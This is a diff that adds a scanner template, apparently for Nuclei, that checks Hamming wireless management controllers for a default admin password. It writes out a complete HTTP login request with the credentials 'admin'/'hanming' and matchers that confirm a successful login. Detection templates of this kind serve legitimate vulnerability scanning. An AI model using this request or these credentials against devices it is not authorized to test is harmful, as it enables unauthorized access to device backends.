@@ -1,0 +1,31 @@
+id: hamming-wireless-default-password
+
+info:
+  name: Default Password on Hamming Wireless Management Controller
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Suzhou Hanming Technology Co., Ltd.'s wireless Web management system contains a default password vulnerability. Attackers can exploit this to gain access to the system backend and retrieve sensitive information.
+  tags: default-password
+
+http:
+  - raw:
+      - |
+        POST /form/switchMlcVersion_login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 62
+
+        LoginAction=1&LoginLang=0&LoginUserName=admin&LoginPassword=hanming
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "main.asp"
